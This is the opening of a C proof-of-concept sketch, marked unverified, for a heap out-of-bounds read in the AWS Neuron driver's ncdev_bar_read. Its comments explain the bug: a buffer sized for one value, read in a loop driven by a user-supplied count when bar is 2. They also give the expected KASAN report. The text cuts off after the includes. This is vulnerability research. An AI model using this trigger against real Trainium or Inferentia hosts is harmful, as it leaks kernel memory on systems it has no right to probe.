/*
 * PoC sketch — heap OOB read in ncdev_bar_read (AWS Neuron driver).
 *
 * UNVERIFIED. Would need to be compiled and run on a host with
 * /dev/neuronN exposed (Trainium / Inferentia EC2 instance, or
 * QEMU + Neuron driver loaded against KASAN-instrumented kernel).
 *
 * Bug summary:
 *   - ncdev_bar_rw (caller) kmalloc's reg_addresses for 1 u64 when
 *     arg.bar != 0
 *   - ncdev_bar_read (callee) loops reg_addresses[0..arg.count-1]
 *   - For arg.bar = 2, arg.count > 1: heap-OOB-read in the validation
 *     loop, then potentially again in fw_io_read_csr_array
 *
 * Expected KASAN signature on a confirmed build:
 *   BUG: KASAN: slab-out-of-bounds in ncdev_bar_read+0x...
 *   Read of size 8 at addr ffff... by task <poc>
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

/* Mirror of struct neuron_io